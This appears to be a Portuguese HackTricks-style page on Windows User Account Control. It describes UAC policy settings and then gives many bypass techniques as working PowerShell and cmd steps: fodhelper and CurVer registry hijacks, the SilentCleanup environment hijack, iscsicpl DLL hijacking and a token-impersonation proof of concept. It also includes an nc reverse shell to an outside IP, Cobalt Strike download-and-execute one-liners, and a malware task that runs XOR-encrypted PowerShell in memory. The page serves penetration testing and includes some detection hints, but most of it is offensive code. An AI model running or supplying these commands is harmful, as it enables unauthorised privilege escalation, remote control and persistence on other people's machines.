# UAC - Controle de Conta de Usuário

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita um **prompt de consentimento para atividades elevadas**. Os aplicativos têm diferentes níveis de `integrity`, e um programa com um **nível alto** pode executar tarefas que **poderiam comprometer o sistema**. Quando o UAC está habilitado, aplicativos e tarefas sempre **são executados no contexto de segurança de uma conta não administrativa**, a menos que um administrador autorize explicitamente esses aplicativos/tarefas a obter acesso de nível administrativo ao sistema para serem executados. É um recurso de conveniência que protege os administradores contra alterações não intencionais, mas não é considerado uma fronteira de segurança.<sup>[[2]](#references)</sup>

Para obter mais informações sobre os níveis de integridade:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: um token de usuário padrão, para executar ações regulares com integridade média, e outro com os privilégios de admin.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica em grande profundidade como o UAC funciona e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC.<sup>[[2]](#references)</sup> Os administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização em nível local (usando secpol.msc), ou configurar e distribuir por meio de Group Policy Objects (GPO) em um ambiente de domínio do Active Directory. As várias configurações são discutidas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Há 10 configurações de Group Policy que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Configuração de Group Policy                                                                                                                                                                                                                                                                                                                                                           | Chave do Registro                | Configuração padrão                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Controle de Conta de Usuário: modo de aprovação de admin para a conta Administrator integrada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Desabilitado)                                             |
| [Controle de Conta de Usuário: comportamento do prompt de elevação para administradores no modo de aprovação de admin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Solicitar consentimento para binários que não sejam do Windows na área de trabalho segura) |
| [Controle de Conta de Usuário: comportamento do prompt de elevação para usuários padrão](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Solicitar credenciais na área de trabalho segura)         |
| [Controle de Conta de Usuário: detectar instalações de aplicativos e solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Habilitado; desabilitado por padrão no Enterprise)           |
| [Controle de Conta de Usuário: elevar apenas executáveis assinados e validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Desabilitado)                                             |
| [Controle de Conta de Usuário: elevar apenas aplicativos UIAccess instalados em locais seguros](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Habilitado)                                              |
| [Controle de Conta de Usuário: executar todos os administradores no modo de aprovação de admin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Habilitado)                                              |
| [Controle de Conta de Usuário: permitir que aplicativos UIAccess solicitem elevação sem usar a área de trabalho segura](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Desabilitado)                                             |
| [Controle de Conta de Usuário: alternar para a área de trabalho segura ao solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Habilitado)                                              |
| [Controle de Conta de Usuário: virtualizar falhas de gravação de arquivos e do Registro em locais por usuário](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Habilitado)                                              |

### Políticas para instalar software no Windows

As **políticas de segurança locais** ("secpol.msc" na maioria dos sistemas) são configuradas por padrão para **impedir que usuários não administradores realizem instalações de software**. Isso significa que, mesmo que um usuário não administrador consiga baixar o instalador do seu software, ele não poderá executá-lo sem uma conta de admin.

### Chaves do Registro para forçar o UAC a solicitar elevação

Como um usuário padrão sem direitos de admin, você pode garantir que a conta "padrão" **seja solicitada a fornecer credenciais pelo UAC** quando tentar executar determinadas ações. Essa ação exigiria modificar determinadas **chaves do Registro**, para as quais você precisa de permissões de admin, a menos que exista um **UAC bypass** ou que o atacante já esteja conectado como admin.

Mesmo que o usuário esteja no grupo **Administrators**, essas alterações forçam o usuário a **inserir novamente as credenciais da conta** para realizar ações administrativas.

**Na prática, isso só é útil quando você já possui um token elevado, um UAC bypass ou uma configuração incorreta que permita alterar essas chaves; caso contrário, a própria gravação no Registro será bloqueada.**

As chaves e entradas do Registro que você deve alterar são as seguintes (com seus valores padrão entre parênteses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Isso também pode ser feito manualmente por meio da ferramenta Local Security Policy. Depois de alteradas, as operações administrativas solicitam que o usuário insira novamente suas credenciais.

### Observação

**O User Account Control não é uma fronteira de segurança.** Portanto, usuários padrão não podem escapar de suas contas e obter direitos de admin sem um exploit de escalada de privilégios local.

### Solicitar "acesso total ao computador" a um usuário
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilégios do UAC

- O Internet Explorer Protected Mode usa verificações de integridade para impedir que processos com nível de integridade alto (como navegadores web) acessem dados com nível de integridade baixo (como a pasta de arquivos temporários da Internet). Isso é feito executando o navegador com um token de baixa integridade. Quando o navegador tenta acessar dados armazenados na zona de baixa integridade, o sistema operacional verifica o nível de integridade do processo e permite o acesso de acordo com ele. Esse recurso ajuda a impedir que ataques de execução remota de código obtenham acesso a dados confidenciais no sistema.
- Quando um usuário faz logon no Windows, o sistema cria um token de acesso que contém uma lista dos privilégios do usuário. Os privilégios são definidos como a combinação dos direitos e capacidades de um usuário. O token também contém uma lista das credenciais do usuário, que são usadas para autenticá-lo no computador e nos recursos da rede.

### Autoadminlogon

Para configurar o Windows para fazer logon automaticamente com um usuário específico na inicialização, defina a **chave de registro `AutoAdminLogon`**. Isso é útil em ambientes de quiosque ou para fins de teste. Use isso somente em sistemas seguros, pois a senha ficará exposta no registro.

Defina as seguintes chaves usando o Editor do Registro ou `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para reverter ao comportamento normal de logon, defina `AutoAdminLogon` como 0.

## Bypass do UAC

> [!TIP]
> Observe que, se você tiver acesso gráfico à vítima, o bypass do UAC é simples, pois basta clicar em "Yes" quando o prompt do UAC aparecer

O bypass do UAC é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil fazer o bypass do UAC quando ele está no nível de segurança mais alto (Always) do que quando está em qualquer um dos outros níveis (Default).**

### Triagem rápida a partir de um shell de integridade média

Antes de tentar um bypass, confirme se você está no cenário correto e associe o build do host aos métodos conhecidos que funcionam:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notas práticas:
- Se `EnableLUA=0`, você não precisa de um bypass: qualquer token de administrador pode solicitar diretamente alta integridade.
- `ConsentPromptBehaviorAdmin=2` ou `5` é o cenário comum para bypasses de auto-elevação / baseados em COM.
- `Always Notify` aumenta o nível de dificuldade, mas você ainda deve testar a build exata em vez de presumir uma falha: o UACME ainda acompanha alguns métodos `AlwaysNotify compatible` em builds modernas do Windows.<sup>[[3]](#references)</sup>

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` for **`0`**), você pode **executar um reverse shell com privilégios de administrador** (nível de integridade alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** Basic UAC "bypass" (acesso completo ao sistema de arquivos)

Se você tiver um shell com um usuário que esteja dentro do grupo Administrators, poderá **montar o compartilhamento C$** via SMB (sistema de arquivos) localmente em um novo disco e terá **acesso a tudo dentro do sistema de arquivos** (até mesmo à pasta inicial do Administrator).

> [!WARNING]
> **Parece que esse truque não está mais funcionando**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass com Cobalt Strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver definido no nível máximo de segurança
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também têm vários módulos para **bypass** do **UAC**.

### Interfaces COM elevadas (`ICMLuaUtil` / `CMSTPLUA`)

Objetos COM com autoelevação continuam sendo uma superfície prática do UAC em builds modernos. O `ICMLuaUtil` ainda é acompanhado pelo UACME como funcional nas branches atuais do Windows, e as ferramentas ofensivas continuam adaptando o `CMSTPLUA` combinando um processo na área de trabalho interativa, execução de 64 bits e, às vezes, masquerading do PEB/processo antes de invocar o COM Elevation Moniker.<sup>[[3]](#references)</sup>

Dicas práticas:
- Prefira um processo de **64 bits** na **sessão interativa** do usuário (comumente `explorer.exe` ou um processo filho dele).
- Se um shell bruto falhar, tente novamente a partir de uma implementação BOF / UACME em vez de um wrapper ingênuo de `CreateProcess`.
- Espere que a execução do processo filho ocorra em um **processo elevado separado**; muitos BOFs não elevam o beacon atual in-place.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass do UAC

[**UACME**](https://github.com/hfiref0x/UACME) é uma coleção de técnicas de bypass do UAC. Compile-o com Visual Studio ou MSBuild; o build cria vários executáveis (por exemplo, `Source\Akagi\output\x64\Debug\Akagi.exe`), portanto selecione o método apropriado para o build do alvo.<sup>[[3]](#references)</sup>\
Cuidado: alguns bypasses iniciam programas visíveis ou prompts que podem alertar o usuário.<sup>[[3]](#references)</sup>

O UACME apresenta a **versão do build a partir da qual cada técnica começou a funcionar**.<sup>[[3]](#references)</sup> Você pode pesquisar uma técnica que afete suas versões:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página, você obtém a versão do Windows `1607` a partir das versões de build.

Um fluxo de trabalho prático é primeiro **avaliar a build do host** e só então executar o método correspondente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compara rapidamente a build local com seus métodos UAC conhecidos, o que é útil para descartar PoCs ineficazes rapidamente.<sup>[[4]](#references)</sup>
- `UACME` continua sendo o melhor catálogo público para mapear um bypass a uma build específica. As versões recentes adicionaram novos métodos e testaram novamente os existentes no **Windows 11 25H2**; portanto, verifique novamente o README e as release notes antes de presumir que uma publicação antiga de blog ainda se aplica sem alterações.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é auto-elevated nas versões modernas do Windows. Quando iniciado, ele consulta o caminho do registro por usuário abaixo sem validar o verbo `DelegateExecute`. Inserir um comando nesse local permite que um processo de Medium Integrity (o usuário está no grupo Administrators) inicie um processo de High Integrity sem um prompt do UAC.

Caminho do registro consultado pelo fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Etapas do PowerShell (defina seu payload e, em seguida, acione-o)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona quando o usuário atual é membro de Administrators e o nível do UAC é padrão/flexível (não Always Notify com restrições adicionais).
- Use o caminho `sysnative` para iniciar um PowerShell de 64 bits a partir de um processo de 32 bits no Windows de 64 bits.
- O Payload pode ser qualquer comando (PowerShell, cmd ou um caminho para um EXE). Evite UIs que exibem prompts para obter stealth.

#### Variante de hijack de CurVer/extensão (somente HKCU)

Amostras recentes que abusam do `fodhelper.exe` evitam `DelegateExecute` e, em vez disso, **redirecionam o ProgID `ms-settings`** por meio do valor `CurVer` por usuário. O binário autoelevado ainda resolve o handler em `HKCU`, portanto nenhum token de admin é necessário para criar as chaves:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Depois de elevar os privilégios, o malware geralmente **desabilita prompts futuros** definindo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` como `0` e, em seguida, realiza evasão de defesa adicional (por exemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) e recria a persistência para ser executado com alta integridade. Uma tarefa de persistência típica armazena um **script PowerShell criptografado com XOR** no disco e o decodifica/executa na memória a cada hora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante ainda limpa o dropper e deixa apenas os staged payloads, fazendo com que a detecção dependa do monitoramento do **hijack de `CurVer`**, da adulteração de `ConsentPromptBehaviorAdmin`, da criação de exclusões no Defender ou de tarefas agendadas que descriptografam o PowerShell na memória.<sup>[[5]](#references)</sup>

### UAC bypass via tarefa `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` inicia `cleanmgr.exe` com privilégios máximos e expande `%windir%` a partir do ambiente do usuário. Se você controlar `HKCU\Environment\windir`, poderá redirecionar essa expansão para um comando arbitrário e obter alta integridade sem uma caixa de diálogo de consentimento.<sup>[[8]](#references)</sup> Esse método ainda vale a pena ser testado em versões recentes, porque o UACME mantém a técnica ativa, e o acompanhamento recente de problemas indica que o Windows 11 24H2 pode exigir apenas pequenos ajustes de aspas.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Se a tarefa citar o caminho nessa build, tente novamente com o payload terminando em uma aspa (por exemplo, `cmd.exe"`). Sempre limpe `HKCU\Environment\windir` após os testes.

#### Mais UAC bypass

Muitos UAC bypass clássicos que abusam de fluxos de UI, objetos COM ou interação com o desktop exigem uma **full interactive session** com a vítima; um shell comum com `nc.exe` ou um serviço em execução na **Session 0** geralmente não é suficiente.

Geralmente, você pode resolver isso usando uma sessão do **meterpreter**. Migre para um **process** que tenha o valor de **Session** igual a **1**:

![Aponte ms-settings para uma extensão personalizada (.thm) e mapeie essa extensão para o nosso payload - Mais UAC bypass: Você pode fazer isso usando uma sessão do meterpreter. Migre para um process que tenha o valor de Session...](<../../images/image (863).png>)

(_explorer.exe_ deve funcionar)

### UAC Bypass com GUI

Se você tiver acesso a uma **GUI**, basta aceitar o prompt do UAC quando ele aparecer; você realmente não precisa de um bypass técnico. Portanto, obter uma sessão de GUI geralmente é suficiente para contornar o atrito prático adicionado pelo UAC.

Além disso, se você obtiver uma sessão de GUI que alguém estava usando (potencialmente via RDP), haverá **algumas ferramentas em execução como administrador**, a partir das quais você poderá **executar** um **cmd**, por exemplo, **como administrador**, diretamente sem receber outro prompt do UAC, como em [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### Noisy brute-force UAC bypass

Se o ruído for aceitável, uma ferramenta como [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) pode solicitar elevação repetidamente até que o usuário a aceite.

### Seu próprio bypass - Metodologia básica de UAC bypass

Se você observar o **UACME**, perceberá que **muitos UAC bypass abusam de DLL hijacking** (frequentemente fazendo com que um binário elevado carregue uma DLL controlada pelo atacante a partir de um caminho gravável). [Leia isto para aprender a encontrar uma vulnerabilidade de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binário que faça **autoelevate** (verifique se, quando executado, ele é executado em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que possam ser vulneráveis a **DLL Hijacking**.
3. Provavelmente, você precisará **escrever** a DLL dentro de alguns **protected paths** (como C:\Windows\System32), onde não possui permissões de escrita. Você pode contornar isso usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Ele permite extrair o conteúdo de um arquivo CAB dentro de protected paths (porque essa ferramenta é executada a partir de um nível de integridade alto).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL para dentro do protected path e executar o binário vulnerável e autoelevated.

### Outra técnica de UAC bypass

Consiste em observar se um **autoElevated binary** tenta **ler** no **registry** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário procurar essas informações dentro do **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + DLL hijack usando o `PATH` do usuário

O `C:\Windows\SysWOW64\iscsicpl.exe` de 32 bits é um binário **auto-elevated** que pode ser abusado para carregar `iscsiexe.dll` pela ordem de pesquisa. Se você puder colocar uma `iscsiexe.dll` maliciosa dentro de uma pasta **gravável pelo usuário** e depois modificar o `PATH` do usuário atual (por exemplo, via `HKCU\Environment\Path`) para que essa pasta seja pesquisada, o Windows poderá carregar a DLL do atacante dentro do processo elevado do `iscsicpl.exe` **sem exibir um prompt do UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Observações práticas:
- Isso é útil quando o usuário atual está no grupo de **Administrators**, mas executa com **Medium Integrity** devido ao UAC.
- A cópia em **SysWOW64** é a relevante para este bypass. Trate a cópia em **System32** como um binário separado e valide o comportamento de forma independente.
- A primitiva é uma combinação de **auto-elevation** e **DLL search-order hijacking**; portanto, o mesmo fluxo de trabalho do ProcMon usado para outros UAC bypass é útil para validar o carregamento da DLL ausente.

Fluxo mínimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideias de detecção:
- Gere um alerta para `reg add` / gravações no registro em `HKCU\Environment\Path` imediatamente seguidas pela execução de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Procure por `iscsiexe.dll` em locais **controlados pelo usuário**, como `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacione execuções de `iscsicpl.exe` com processos filhos inesperados ou carregamentos de DLL a partir de diretórios fora dos diretórios normais do Windows.

### Pesquisas mais recentes que vale a pena verificar separadamente

Algumas chains posteriores a 2024 já não se parecem com os hijacks clássicos do registro em `HKCU\Software\Classes`. Por exemplo, activation-context cache poisoning pode encadear um **drive remap** e **DLL redirection** para passar de integridade média para alta por meio de binários trusted UI / auto-elevated, como `ctfmon.exe`, e posteriormente alvos como `fodhelper.exe`. Em vez de duplicar o grande PoC aqui, consulte os exemplos compactos de payload em:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack de letra de unidade do Administrator Protection (25H2) por meio do mapa de dispositivos DOS por sessão de logon

Para obter a superfície de ataque completa de `RAiLaunchAdminProcess` / UIAccess no Windows 11 25H2, consulte a página dedicada:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

O “Administrator Protection” do Windows 11 25H2 usa tokens shadow-admin com mapas `\Sessions\0\DosDevices/<LUID>` por sessão. O diretório é criado de forma lazy por `SeGetTokenDeviceMap` na primeira resolução de `\??`. Se o atacante impersonar o token shadow-admin somente em **SecurityIdentification**, o diretório será criado com o atacante como **owner** (herdando `CREATOR OWNER`), permitindo links de letras de unidade que têm precedência sobre `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Etapas:**

1. De uma sessão com poucos privilégios, chame `RAiProcessRunOnce` para iniciar um `runonce.exe` shadow-admin sem prompt.
2. Duplique o token primário para um token de **identification** e faça impersonation dele enquanto abre `\??` para forçar a criação de `\Sessions\0\DosDevices/<LUID>` sob propriedade do atacante.
3. Crie um symlink `C:` nesse local apontando para um armazenamento controlado pelo atacante; os acessos subsequentes ao sistema de arquivos nessa sessão resolverão `C:` para o caminho do atacante, permitindo DLL/file hijack sem um prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Como funciona o User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Coleção de técnicas de bypass de UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilidade e launcher de bypass de UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Adota IA para Gerar Backdoors em PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operação TrueChaos: Exploração de 0-Day Contra Alvos Governamentais do Sudeste Asiático](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass da Proteção de Administrador do Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass de UAC Usando a Tarefa SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
